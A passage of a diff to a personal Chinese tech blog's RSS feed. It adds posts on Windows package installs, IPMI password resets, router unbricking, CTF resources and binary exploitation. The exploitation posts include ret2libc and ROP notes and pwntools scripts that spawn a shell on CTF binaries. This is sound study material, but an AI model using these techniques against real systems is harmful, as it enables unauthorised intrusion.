@@ -20,6 +20,61 @@
 scoop 是一套 windows 下的 installer，有點像是 MacOS 下的 brew 以 powershell 當做後端
 也有許多 buckets 可以加入
 scoop bucket add nerd-fonts scoop bucket add extras 7zip 21.07 [main] ag 2.2.5 [main] anydesk 7.0.4 [extras] aria2 1.36.0-1 [main] bat 0.19.0 [main] cacert 2021-10-26 [main] cmake 3.22.1 [main] croc 9.5.0 [main] curl 7.81.0 [main] dark 3.11.2 [main] draw.io 16.0.0 [extras] DroidSansMono-NF 2.1.0 [nerd-fonts] file 5.38 [main] FiraCode 6.2 [nerd-fonts] firefox 95.0.2 [extras] git 2.34.1.windows.1 [main] hashcheck 2.</description>
+      <content:encoded><![CDATA[<p>紀錄一下安裝清單</p>
+<p><a href="https://scoop.sh/">scoop</a> 是一套 windows 下的 installer，有點像是 MacOS 下的 <code>brew</code>
+以 powershell 當做後端</p>
+<p>也有許多 <a href="https://github.com/ScoopInstaller/Scoop#known-application-buckets">buckets</a> 可以加入</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-diff" data-lang="diff">scoop bucket add nerd-fonts
+scoop bucket add extras
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">  7zip 21.07 [main]
+  ag 2.2.5 [main]
+  anydesk 7.0.4 [extras]
+  aria2 1.36.0-1 [main]
+  bat 0.19.0 [main]
+  cacert 2021-10-26 [main]
+  cmake 3.22.1 [main]
+  croc 9.5.0 [main]
+  curl 7.81.0 [main]
+  dark 3.11.2 [main]
+  draw.io 16.0.0 [extras]
+  DroidSansMono-NF 2.1.0 [nerd-fonts]
+  file 5.38 [main]
+  FiraCode 6.2 [nerd-fonts]
+  firefox 95.0.2 [extras]
+  git 2.34.1.windows.1 [main]
+  hashcheck 2.4.0 [extras]
+  hugo 0.91.2 [main]
+  keepassxc 2.6.6 [extras]
+  lessmsi 1.10.0 [main]
+  llvm 13.0.0 [main]
+  make 4.3 [main]
+  mattermost 5.0.2 [extras]
+  Meslo-NF 2.1.0 [nerd-fonts]
+  netcat 1.12 [main]
+  obs-studio 27.1.3 [extras]
+  posh-git 1.0.0 [extras]
+  processhacker 2.39 [extras]
+  python 3.10.1 [main]
+  rufus 3.17 [extras]
+  SourceCodePro-NF 2.1.0 [nerd-fonts]
+  speedtest-cli 1.1.1 [main]
+  sqlitebrowser 3.12.2 [extras]
+  sudo 0.2020.01.26 [main]
+  sysinternals 2021.October.26 [extras]
+  teamviewer 15.24.5 [extras]
+  telegram 3.3.0 [extras]
+  Ubuntu-NF 2.1.0 [nerd-fonts]
+  UbuntuMono-NF 2.1.0 [nerd-fonts]
+  vim 8.2.2824 [main]
+  vlc 3.0.16 [extras]
+  vscode 1.63.2 [extras]
+  wget 1.21.2 [main]
+  winbox 3.31 [extras]
+  winscp 5.19.5 [extras]
+  x64dbg 2021-12-05_15-32 [extras]
+  xmake 2.6.2 [main]
+  yara 4.1.3-1755 [main]
+</code></pre></div>]]></content:encoded>
     </item>
     
     <item>
@@ -34,6 +89,25 @@ https://www.supermicro.com/SwDownload/SwSelect_Free.aspx?cat=IPMI
 ipmicfg -user list Maximum number of Users : 10 Count of currently enabled Users : 1 User ID | User Name | Privilege Level | Enable --------|-----------|-----------------|------- 2 | admin | Administrator | Yes ipmicfg -user setpwd 2 admin 或是回到原廠設定
 ipmicfg -fd ref
  https://blog.kingj.net/2014/03/15/how-to/resetting-the-ipmi-password-on-the-e3c224d2i/ https://support.siliconmechanics.com/portal/en/kb/articles/resetting-the-bmc</description>
+      <content:encoded><![CDATA[<p>因為在網路上買了一片 ASRock 的二手 server 主機板，想用 IPMI 的功能，不過密碼已經被改過了，所以上網找一下有沒有可以 reset 的方法</p>
+<p>首先可以用個隨便 windows 開機，下載 supermicro 的工具 IPMICFG</p>
+<p><a href="https://www.supermicro.com/SwDownload/SwSelect_Free.aspx?cat=IPMI">https://www.supermicro.com/SwDownload/SwSelect_Free.aspx?cat=IPMI</a></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">ipmicfg -user list
+
+Maximum number of Users          : 10
+Count of currently enabled Users : 1
+User ID | User Name | Privilege Level | Enable
+--------|-----------|-----------------|-------
+2       | admin     | Administrator   | Yes
+
+ipmicfg -user setpwd 2 admin
+</code></pre></div><p>或是回到原廠設定</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">ipmicfg -fd
+</code></pre></div><p>ref</p>
+<hr>
+<p><a href="https://blog.kingj.net/2014/03/15/how-to/resetting-the-ipmi-password-on-the-e3c224d2i/">https://blog.kingj.net/2014/03/15/how-to/resetting-the-ipmi-password-on-the-e3c224d2i/</a>
+<a href="https://support.siliconmechanics.com/portal/en/kb/articles/resetting-the-bmc">https://support.siliconmechanics.com/portal/en/kb/articles/resetting-the-bmc</a></p>
+]]></content:encoded>
     </item>
     
     <item>
@@ -47,6 +121,19 @@ ipmicfg -fd ref
 例如：https://wiki.openwrt.org/toh/d-link/dir-300revb
 接上以後會出現以下選單，手速要快一點，選擇 &amp;ldquo;2&amp;rdquo; 可以連接到電腦架設的 TFTP Server 抓取韌體並重刷。
 Please choose the operation: 1: Load system code to SDRAM via TFTP. 2: Load system code then write to Flash via TFTP. 3: Boot system code via Flash (default). 4: Entr boot command line interface. 7: Load Boot Loader code then write to Flash via Serial.</description>
+      <content:encoded><![CDATA[<p>之前刷 Router 的時候不小心把它刷爆了，變成磚，可以透過 FT232 工具把 Router 的殼拆掉，對接上面的 RS232，其中 GND, TX, RX 接到電腦可以直接下 command，也可以執行 system shell。</p>
+<p>使用 Putty 連接 FT232 的 COM Port，至於Router板子上面的腳位可以透過 DD-WRT 或是 Open-WRT 中的 Wiki，幾乎很多路由器都有可以參考的資料。</p>
+<p>例如：<a href="https://wiki.openwrt.org/toh/d-link/dir-300revb">https://wiki.openwrt.org/toh/d-link/dir-300revb</a></p>
+<p>接上以後會出現以下選單，手速要快一點，選擇 &ldquo;2&rdquo; 可以連接到電腦架設的 TFTP Server 抓取韌體並重刷。</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">   Please choose the operation:
+   1: Load system code to SDRAM via TFTP.
+   2: Load system code then write to Flash via TFTP.
+   3: Boot system code via Flash (default).
+   4: Entr boot command line interface.
+   7: Load Boot Loader code then write to Flash via Serial.
+   9: Load Boot Loader code then write to Flash via TFTP.
+</code></pre></div><p>電腦設定固定 ip，然後網路線連到 Router，輸入電腦 ip 與韌體的檔名就好了。</p>
+]]></content:encoded>
     </item>
     
     <item>
@@ -58,6 +145,55 @@ Please choose the operation: 1: Load system code to SDRAM via TFTP. 2: Load syst
       <description>陸續更新～
 website, doc and video https://ctf-wiki.github.io/ctf-wiki LiveOverflow youtube channel https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w http://liveoverflow.com/binary_hacking/protostar/index.html Heap 手法整理 https://github.com/shellphish/how2heap 日本選手的一系列投影片 http://www.slideshare.net/bata_24/presentations 杨坤：掘金CTF ——CTF中的内存漏洞利用技巧 http://netsec.ccert.edu.cn/wp-content/uploads/2015/10/2015-1029-yangkun-Gold-Mining-CTF.pdf Modern Binary Exploitation by RPISEC http://security.cs.rpi.edu/courses/binexp-spring2015/ https://github.com/RPISEC/MBE https://raintrees.net/projects/a-painter-and-a-black-cat/wiki/CTF_Pwn inaz2 整理的 exploit 手法 http://inaz2.hatenablog.com/archive/category/Exploit?page=1 http://inaz2.hatenablog.com/archive/category/Exploit?page=2 http://j00ru.vexillium.org/blog/24_03_15/dragons_ctf.pdf https://github.com/str4tan/pwning Heap: https://github.com/cloudburst/libheap https://github.com/DhavalKapil/libdheap https://github.com/degrigis/Heapy https://github.com/shellphish/how2heap wargame and ctf https://pwnable.tw/ http://pwnable.kr/ https://bamboofox.cs.nctu.edu.tw/ http://overthewire.org/wargames/ https://w3challs.com/ https://exploit-exercises.com/nebula/ http://ctf.katsudon.org/ http://ctf.katsudon.org/ctf4u/ tools debug
 https://github.com/snare/voltron </description>
+      <content:encoded><![CDATA[<p>陸續更新～</p>
+<h2 id="website-doc-and-video">website, doc and video</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">https://ctf-wiki.github.io/ctf-wiki
+
+LiveOverflow youtube channel
+https://www.youtube.com/channel/UClcE-kVhqyiHCcjYwcpfj9w
+http://liveoverflow.com/binary_hacking/protostar/index.html
+
+Heap 手法整理
+https://github.com/shellphish/how2heap
+
+日本選手的一系列投影片
+http://www.slideshare.net/bata_24/presentations
+
+杨坤：掘金CTF ——CTF中的内存漏洞利用技巧
+http://netsec.ccert.edu.cn/wp-content/uploads/2015/10/2015-1029-yangkun-Gold-Mining-CTF.pdf
+
+Modern Binary Exploitation by RPISEC
+http://security.cs.rpi.edu/courses/binexp-spring2015/
+https://github.com/RPISEC/MBE
+
+https://raintrees.net/projects/a-painter-and-a-black-cat/wiki/CTF_Pwn
+
+inaz2 整理的 exploit 手法
+http://inaz2.hatenablog.com/archive/category/Exploit?page=1
+http://inaz2.hatenablog.com/archive/category/Exploit?page=2
+
+http://j00ru.vexillium.org/blog/24_03_15/dragons_ctf.pdf
+
+https://github.com/str4tan/pwning
+
+Heap:
+https://github.com/cloudburst/libheap
+https://github.com/DhavalKapil/libdheap
+https://github.com/degrigis/Heapy
+https://github.com/shellphish/how2heap
+</code></pre></div><h2 id="wargame-and-ctf">wargame and ctf</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">https://pwnable.tw/
+http://pwnable.kr/
+https://bamboofox.cs.nctu.edu.tw/
+http://overthewire.org/wargames/
+https://w3challs.com/
+https://exploit-exercises.com/nebula/
+http://ctf.katsudon.org/
+http://ctf.katsudon.org/ctf4u/
+</code></pre></div><h2 id="tools">tools</h2>
+<p><strong>debug</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">https://github.com/snare/voltron
+</code></pre></div>]]></content:encoded>
     </item>
     
     <item>
@@ -71,6 +207,50 @@ https://github.com/snare/voltron </description>
  monaco sourcecode pro Bitstream Vera Sans Mono ubuntu mono  硬體 架了一台家裡的server，跑debian，總耗電瓦數不超過30瓦，非常省電CP值超高!!!，唯一覺得可惜的是，SATA接頭只有2個而且主機板沒有支援RAID的功能
 mb:asus N3150M-E ram:8G storage:120G SSD + 1T 鍵盤 ducky one 80% 茶軸，自己換了PBT鍵帽，PBT摸起來感覺有種粉粉的感覺，也買好清理的，高度Cherry原廠鍵帽的高度，剛開始是OEM不過用個幾天就習慣了
 軟體 f.lux - 飽護眼睛 飽護眼睛的，可以讓白色變得比較黃一點，看久了眼睛不會那麼吃力，字體當然是要調大一點更好 Karabiner - 鍵盤映射 &amp;lt;https://pqrs.org/osx/karabiner/&amp;gt;可以調整osx 的映射鍵把F1-F12 換成，歌曲切換聲音調整之類的，另外我也用內建的工具把`Caps lock`換成 `ctrl`，這樣 tmux 比較好用 `Caps` + `a` 就行 parallels desktop - 虛擬機 融合模式超猛，偶爾開 IDA Pro 或是些win 的軟體 VANILLA &amp;lt;http://matthewpalmer.net/vanilla/&amp;gt; services docker - nginx - php - ubuntu for pwnable avahi-daemon (在區網中可以直接使用 hostname.</description>
+      <content:encoded><![CDATA[<p>紀錄一下環境的東西，有什麼沒記錄到的之後再更新</p>
+<h1 id="字體">字體</h1>
+<p>等寬字體</p>
+<ul>
+<li>monaco</li>
+<li>sourcecode pro</li>
+<li>Bitstream Vera Sans Mono</li>
+<li>ubuntu mono</li>
+</ul>
+<h1 id="硬體">硬體</h1>
+<p>架了一台家裡的server，跑debian，總耗電瓦數不超過30瓦，非常省電CP值超高!!!，唯一覺得可惜的是，SATA接頭只有2個而且主機板沒有支援RAID的功能</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-diff" data-lang="diff">mb:asus N3150M-E
+ram:8G
+storage:120G SSD + 1T
+</code></pre></div><h2 id="鍵盤">鍵盤</h2>
+<p>ducky one 80% 茶軸，自己換了PBT鍵帽，PBT摸起來感覺有種粉粉的感覺，也買好清理的，高度Cherry原廠鍵帽的高度，剛開始是OEM不過用個幾天就習慣了</p>
+<h1 id="軟體">軟體</h1>
+<h2 id="flux---飽護眼睛">f.lux - 飽護眼睛</h2>
+<pre><code>飽護眼睛的，可以讓白色變得比較黃一點，看久了眼睛不會那麼吃力，字體當然是要調大一點更好
+</code></pre>
+<h2 id="karabiner---鍵盤映射">Karabiner - 鍵盤映射</h2>
+<pre><code>&lt;https://pqrs.org/osx/karabiner/&gt;
+
+可以調整osx 的映射鍵把F1-F12 換成，歌曲切換聲音調整之類的，另外我也用內建的工具把`Caps lock`換成 `ctrl`，這樣 tmux 比較好用 `Caps` + `a` 就行
+</code></pre>
+<h2 id="parallels-desktop---虛擬機">parallels desktop - 虛擬機</h2>
+<pre><code>融合模式超猛，偶爾開 IDA Pro 或是些win 的軟體
+</code></pre>
+<h2 id="vanilla">VANILLA</h2>
+<pre><code>&lt;http://matthewpalmer.net/vanilla/&gt;
+</code></pre>
+<h1 id="services">services</h1>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-diff" data-lang="diff">docker - nginx - php - ubuntu for pwnable
+avahi-daemon  (在區網中可以直接使用 hostname.local 登入)
+time-machine (硬碟格式需要注意一下，我是用ext4)
+samba
+</code></pre></div><p>在iterm下新增多個profile，搭配command <code>ssh user@192.168.xx.xx</code> ，使用ssh-key <code>cmd</code> + <code>o</code> ，開啟視窗直接選擇要登入的主機爽度大增</p>
+<h2 id="pwnable">pwnable</h2>
+<p>用docker跑起來的，寫了shell script跟一般的dotfile 分離，有興趣可以看一下
+<a href="https://github.com/zet235/ctf-tools">https://github.com/zet235/ctf-tools</a></p>
+<p>reference</p>
+<hr>
+<p><a href="https://samuelhewitt.com/blog/2015-09-12-debian-linux-server-mac-os-time-machine-backups-how-to">https://samuelhewitt.com/blog/2015-09-12-debian-linux-server-mac-os-time-machine-backups-how-to</a></p>
+]]></content:encoded>
     </item>
     
     <item>
@@ -88,6 +268,125 @@ padding + function + ret address + argv1 + argv2 + argv3 .... 一般 function �
 &amp;#39;A&amp;#39;*100 + p32(system_addr) + p32(0) + p32(binsh_addr) x64: 利用一些 pop reg 的getgads把reg設定好
 x32 參數直接疊在stack上，用 pop_ret 清掉用過的參數
 read @ plt pop_pop_pop_ret 0 addr length system @ plt x86_64  最大地址 0x00007fffffffffff  DynELF 假如在不知道對方libc 的情況下可以使用pwntools中的一個工具DynELF，給他一個leak的點，可以幫你找出function的位置</description>
+      <content:encoded><![CDATA[<p>整理一下</p>
+<h2 id="找-getgads-工具">找 getgads 工具</h2>
+<ul>
+<li>rp++</li>
+<li>ROPgadget</li>
+</ul>
+<h2 id="ret2libc">Ret2libc</h2>
+<p>當程式有打開<code>NX</code>的時候造成 stack 上的 shellcode 無法執行，可以利用<code>ret2libc</code>或是利用ROP做<code>mprotect</code>開一個rwx的段，</p>
+<h3 id="參數傳遞">參數傳遞</h3>
+<ul>
+<li>x86
+利用stack</li>
+<li>x86_64
+利用reg</li>
+</ul>
+<h3 id="ret2libc-疊法">Ret2libc 疊法</h3>
+<p>可以盡可能的把參數疊完整，比較不會發生一些鳥問題</p>
+<p>一般x86的疊法是：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">padding +  function + ret address + argv1 + argv2 + argv3 ....
+</code></pre></div><p>一般 function 可以直接跳 <code>.plt</code> ， ret address 是執行完以後我要去的地方，假如一般疊出 system(&quot;/bin/sh&quot;)，ret address 可以直接填空沒關係</p>
+<p>例如 :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">&#39;A&#39;*100 + p32(system_addr) + p32(0) + p32(binsh_addr)
+</code></pre></div><p>x64:
+利用一些 <code>pop reg</code> 的getgads把reg設定好</p>
+<h3 id="x32">x32</h3>
+<p>參數直接疊在stack上，用 pop_ret 清掉用過的參數</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-diff" data-lang="diff">read @ plt
+pop_pop_pop_ret
+0
+addr
+length
+system @ plt
+</code></pre></div><h3 id="x86_64">x86_64</h3>
+<ul>
+<li>最大地址 <code>0x00007fffffffffff</code></li>
+</ul>
+<h3 id="dynelf">DynELF</h3>
+<p>假如在不知道對方libc 的情況下可以使用pwntools中的一個工具<code>DynELF</code>，給他一個leak的點，可以幫你找出function的位置</p>
+<p>這是313c CTF 中的 cfy 可以當作練習</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+<span style="color:#f92672">import</span> time
+
+printf_got <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x601020</span>
+
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">leak</span>(addr):
+    r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;2&#39;</span>)
+    r<span style="color:#f92672">.</span>sendline(p64(addr) )
+    s <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>recvline_contains(<span style="color:#e6db74">&#39;hex: 0x&#39;</span>)[<span style="color:#ae81ff">5</span>:]<span style="color:#f92672">.</span>strip()
+    s <span style="color:#f92672">=</span> p64( int(s,<span style="color:#ae81ff">16</span>) )
+    <span style="color:#66d9ef">return</span> s
+
+r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;localhost&#39;</span>,<span style="color:#ae81ff">4000</span>)
+
+ptr_libc <span style="color:#f92672">=</span> u64(leak(printf_got))
+d <span style="color:#f92672">=</span> DynELF(leak, ptr_libc)
+system <span style="color:#f92672">=</span> d<span style="color:#f92672">.</span>lookup(<span style="color:#e6db74">&#39;system&#39;</span>)
+
+print r<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">&#39;quit&#39;</span>)
+r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;7&#39;</span>)
+r<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">&#39;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span> p64(system) )
+
+r<span style="color:#f92672">.</span>interactive()
+</code></pre></div><h3 id="aslr">ASLR</h3>
+<ul>
+<li>aslr on</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">sudo sysctl -w kernel.randomize_va_space=2
+</code></pre></div><ul>
+<li>aslr off</li>
+</ul>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">sudo sysctl -w kernel.randomize_va_space=0
+</code></pre></div><p>假如有ASLR，本的的話 32bit可以使用<code>ulimit -s unlimited</code>關閉，或是可以利用<code>puts</code>，leak <code>.got</code> 段上的資料 同一個 libc function 之間的偏移是固定的</p>
+<p>一般常出現的函數 :</p>
+<ul>
+<li>__libc_start_main</li>
+<li>puts</li>
+<li>read</li>
+<li>write</li>
+<li>&hellip;..</li>
+</ul>
+<h2 id="x64-通用gadgets">x64 通用gadgets</h2>
+<p>這些函數都可以利用</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-diff" data-lang="diff">_init
+_start
+call_gmon_start
+deregister_tm_clones
+register_tm_clones
+__do_global_dtors_aux
+frame_dummy
+__libc_csu_init
+__libc_csu_fini
+_fini
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-diff" data-lang="diff">ROPgadget --binary ./binary --depth 100
+</code></pre></div><p>不從版本 gadgets 會不太一樣，不過都可以通用，在於__libc_csu_init()</p>
+<p>假如有些指令切一半的話也可以對reg做操作</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-diff" data-lang="diff">&lt;__libc_csu_init&gt;:
+5b                       pop    rbx
+5d                       pop    rbp
+41 5c                    pop    r12   -&gt;   pop rsp (5c)
+41 5d                    pop    r13   -&gt;   pop rbp (5d)
+41 5e                    pop    r14   -&gt;   pop rsi (5e)
+41 5f                    pop    r15   -&gt;   pop rdi (5f)
+c3                       ret
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-diff" data-lang="diff">mov    rbx,QWORD PTR [rsp+0x8]
+mov    rbp,QWORD PTR [rsp+0x10]
+mov    r12,QWORD PTR [rsp+0x18]
+mov    r13,QWORD PTR [rsp+0x20]
+mov    r14,QWORD PTR [rsp+0x28]
+mov    r15,QWORD PTR [rsp+0x30]
+add    rsp,0x38
+ret
+</code></pre></div><p>利用這些gadgets可以把 r12-r15 控好，<code>call qword ptr [r12+rbx*8]</code>的時候可以將<code>rbp等於1，rbx等於0</code>才會繼續ret下去，這部分可以自己跟一次比較清楚</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">4c 89 ea                 mov    rdx,r13
+4c 89 f6                 mov    rsi,r14
+44 89 ff                 mov    edi,r15d
+41 ff 14 dc              call   QWORD PTR [r12+rbx*8]
+</code></pre></div><h2 id="one-gadgets-rce">One gadgets RCE</h2>
+<p>在一些特定的libc中藏有可以直接執行execv(&quot;/bin/sh&quot;)，可以觀察一下libc中有用到execv的附近藏有&quot;/bin/sh&quot;的字串，有機會可以直接成功</p>
+]]></content:encoded>
     </item>
     
     <item>
@@ -98,6 +397,52 @@ read @ plt pop_pop_pop_ret 0 addr length system @ plt x86_64  最大地址 0x000
       <guid>https://blog.zet.tw/posts/2016-05-21-tu-ctf-where-heretics-suffer/</guid>
       <description>拿到這題的時候已經是一隻binary了，這是用比較新的gcc編的，對於function call 有一些新的機制，如下：
 80485cb: 8d 4c 24 04 lea ecx,[esp+0x4] 80485cf: 83 e4 f0 and esp,0xfffffff0 80485d2: ff 71 fc push DWORD PTR [ecx-0x4] 80485d5: 55 push ebp 80485d6: 89 e5 mov ebp,esp 80485d8: 51 push ecx 80485d9: 83 ec 34 sub esp,0x34 ...... 8048682: b8 00 00 00 00 mov eax,0x0 8048687: 8b 4d fc mov ecx,DWORD PTR [ebp-0x4] 804868a: c9 leave 804868b: 8d 61 fc lea esp,[ecx-0x4] 804868e: c3 ret 可以看到在初始化的時候lea ecx,[esp+0x4]，會把esp得值放到ecx中 之後再把ecx放到stack上，當我們overflow以後會把原本得直也蓋掉</description>
+      <content:encoded><![CDATA[<p>拿到這題的時候已經是一隻binary了，這是用比較新的gcc編的，對於function call 有一些新的機制，如下：</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-markdown" data-lang="markdown"> 80485cb:       8d 4c 24 04             lea    ecx,[esp+0x4]
+ 80485cf:       83 e4 f0                and    esp,0xfffffff0
+ 80485d2:       ff 71 fc                push   DWORD PTR [ecx-0x4]
+ 80485d5:       55                      push   ebp
+ 80485d6:       89 e5                   mov    ebp,esp
+ 80485d8:       51                      push   ecx
+ 80485d9:       83 ec 34                sub    esp,0x34
+
+ ......
+
+ 8048682:       b8 00 00 00 00          mov    eax,0x0
+ 8048687:       8b 4d fc                mov    ecx,DWORD PTR [ebp-0x4]
+ 804868a:       c9                      leave
+ 804868b:       8d 61 fc                lea    esp,[ecx-0x4]
+ 804868e:       c3                      ret
+</code></pre></div><p>可以看到在初始化的時候<code>lea    ecx,[esp+0x4]</code>，會把esp得值放到<code>ecx</code>中 之後再把<code>ecx</code>放到stack上，當我們overflow以後會把原本得直也蓋掉</p>
+<p>題目滿好心的有提供很多東西所以可以算出<code>system</code>的位置，也有給buffer的位置，所以我們直接把 ret address 填到 buffer 開頭的位置這樣esp，控制好以後esp才不會爛掉，之後照正常疊 <code>ret2libc</code> 就行了</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+
+e <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;/lib32/libc.so.6&#39;</span>)
+<span style="color:#75715e">#e = ELF(&#39;./libc.so.6&#39;)</span>
+
+r <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;127.0.0.1&#34;</span>,<span style="color:#ae81ff">4000</span>)
+r<span style="color:#f92672">.</span>recvlines(<span style="color:#ae81ff">2</span>)
+puts <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip()[<span style="color:#ae81ff">47</span>:<span style="color:#ae81ff">57</span>]
+print <span style="color:#e6db74">&#39;puts : &#39;</span>,puts
+puts <span style="color:#f92672">=</span> int(puts, <span style="color:#ae81ff">16</span>)
+
+buffer <span style="color:#f92672">=</span> r<span style="color:#f92672">.</span>recvline()<span style="color:#f92672">.</span>strip()[<span style="color:#f92672">-</span><span style="color:#ae81ff">10</span>:]
+print <span style="color:#e6db74">&#39;buffer :&#39;</span>,buffer
+buffer <span style="color:#f92672">=</span> int(buffer,<span style="color:#ae81ff">16</span>)
+
+system <span style="color:#f92672">=</span> puts <span style="color:#f92672">-</span> ( e<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;puts&#39;</span>] <span style="color:#f92672">-</span> e<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;system&#39;</span>] )
+print <span style="color:#e6db74">&#39;system : &#39;</span>,hex(system)
+
+payload <span style="color:#f92672">=</span> p32(system) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p32(buffer <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span><span style="color:#f92672">*</span><span style="color:#ae81ff">7</span>) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0</span>) <span style="color:#f92672">+</span> p32(<span style="color:#ae81ff">0</span>)
+payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;/bin/sh</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#39;</span>
+payload <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#39;A&#39;</span><span style="color:#f92672">*</span>(<span style="color:#ae81ff">44</span><span style="color:#f92672">-</span>len(payload))
+print len(payload)
+
+
+r<span style="color:#f92672">.</span>sendline( payload <span style="color:#f92672">+</span> p32( buffer <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>)  )
+
+r<span style="color:#f92672">.</span>interactive()
+</code></pre></div>]]></content:encoded>
     </item>
     
     <item>
@@ -109,6 +454,12 @@ read @ plt pop_pop_pop_ret 0 addr length system @ plt x86_64  最大地址 0x000
       <description>把install.sh裡面capstone的地方註解掉後執行
 下載capstone
 git clone https://github.com/aquynh/capstone.git $ ./make.sh $ sudo ./make.sh install </description>
+      <content:encoded><![CDATA[<p>把<code>install.sh</code>裡面capstone的地方註解掉後執行</p>
+<p>下載capstone</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">git clone https://github.com/aquynh/capstone.git
+</code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">$ ./make.sh
+$ sudo ./make.sh install
+</code></pre></div>]]></content:encoded>
     </item>
     
     <item>
@@ -123,6 +474,19 @@ git clone https://github.com/aquynh/capstone.git $ ./make.sh $ sudo ./make.sh in
 可以參考下方的參考資料
 References
